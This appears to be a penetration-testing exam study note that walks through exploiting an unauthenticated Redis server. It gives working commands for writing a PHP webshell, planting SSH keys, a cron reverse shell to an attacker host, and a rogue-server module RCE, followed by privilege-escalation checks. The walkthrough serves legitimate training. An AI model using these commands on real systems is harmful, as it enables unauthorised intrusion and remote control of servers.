# 🧱 Scenario 13 — Unauthenticated Redis (6379) → RCE

> **Given (from nmap):** Ubuntu box — `22 OpenSSH 8.9p1`, `80 Apache 2.4.52` (**`Index of /`**), `6379 Redis 4.0.14` with **no auth**. Goal: foothold → root + proof. An open Redis with a writable primitive is a **direct RCE**. Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]]. Services: [[Redis]] · [[HTTP]] · [[SSH]]. Foothold: [[RCE]] · [[Shells]]. Then: [[Linux Privilege Escalation]].

```bash
export IP=<TARGET_IP> ; mkdir -p loot
```

---

## 🧠 WHY REDIS = GAME OVER
Redis with **no `requirepass`** lets you **write arbitrary files** (it's `CONFIG SET dir` + `dbfilename` + `SAVE`). Point that write at a web root, an `.ssh` dir, or cron → **RCE**. Redis **4.x/5.x** also allows a **replication/module** RCE that needs no writable path at all. The box even hands you the web path: Apache + `Index of /` → write a webshell.

```bash
redis-cli -h $IP                 # connects with no creds?
  INFO server ; CONFIG GET dir ; CONFIG GET dbfilename ; CONFIG GET requirepass
```

---

## 🅰️ Webshell into the web root (cleanest here — Apache is present)
```bash
redis-cli -h $IP <<'EOF'
config set dir /var/www/html
config set dbfilename shell.php
set x "\n\n<?php system($_GET['c']); ?>\n\n"
save
EOF
curl "http://$IP/shell.php?c=id"        # → www-data; then reverse shell ([[Shells]])
```
Find the real web root first if unsure (`Index of /` path, `/var/www/html`, vhost docroot).

## 🅱️ Write an SSH key (if you can hit a user's `.ssh`)
```bash
ssh-keygen -t ed25519 -f ./k -q -N ''
(echo; echo; cat k.pub; echo) > key.txt
redis-cli -h $IP flushall
cat key.txt | redis-cli -h $IP -x set sshkey
redis-cli -h $IP <<'EOF'
config set dir /home/<user>/.ssh        # or /root/.ssh if redis runs as root
config set dbfilename authorized_keys
save
EOF
ssh -i ./k <user>@$IP
```

## 🅲 Cron reverse shell (Debian/Ubuntu)
```bash
redis-cli -h $IP <<'EOF'
config set dir /var/spool/cron/crontabs   # or /etc/cron.d
config set dbfilename <user>
set x "\n\n* * * * * <user> bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'\n\n"
save
EOF
# listener: nc -lvnp 443   (needs redis write perms to the cron path)
```

## 🅳 Module / replication RCE (Redis 4.x–5.x — no writable path needed)
```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server ; cd redis-rogue-server
python3 redis-rogue-server.py --rhost $IP --rport 6379 --lhost <KALI> --lport 4444
# SLAVEOF your rogue master -> loads a malicious module -> command exec
```
Use this when `CONFIG` is restricted or no writable path works. **Redis 4.0.14 is in range.**

---

## 2️⃣ FOOTHOLD → PRIVESC
You land as **`redis`** (module/cron) or **`www-data`** (webshell):
```bash
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; ./linpeas.sh | tee loot/linpeas.txt
```
The `redis` user often has interesting group/file access; check `sudo -l`, SUID, and `/var/lib/redis`. → [[Linux Privilege Escalation]].

## 🗺️ DECISION FLOW
```
6379 Redis, no requirepass ──► redis-cli ──► CONFIG GET dir/dbfilename
   ├─ web root writable (Apache) ──► webshell ──► www-data ─┐
   ├─ user .ssh writable ──► authorized_keys ──► ssh -i ────┤
   ├─ cron path writable ──► cron reverse shell ────────────┤
   └─ CONFIG locked ──► redis-rogue-server (module RCE) ─────┘
                                                             ▼
                                        shell ──► sudo -l/SUID ──► ROOT ✅
```

## 🚧 STUCK?
1. `CONFIG` disabled/renamed → use **Path D** (module/replication RCE).
2. Webshell saved but 500/garbled → Redis prepends binary; keep the `\n\n` padding and a simple one-liner; confirm the **web root path**.
3. `requirepass` set → look for the password in web configs / other loot, then `redis-cli -a <pass>`.
→ [[Standalone Boxes — Exam Solve Guide]] (Stuck section).

## 🧠 ONE-LINE LESSON
**Unauth Redis = arbitrary file write: `CONFIG SET dir`+`dbfilename`+`SAVE` to drop a webshell (web root), an `authorized_keys` (.ssh), or a cron job — or use the Redis 4.x/5.x module/replication RCE when CONFIG is locked.**
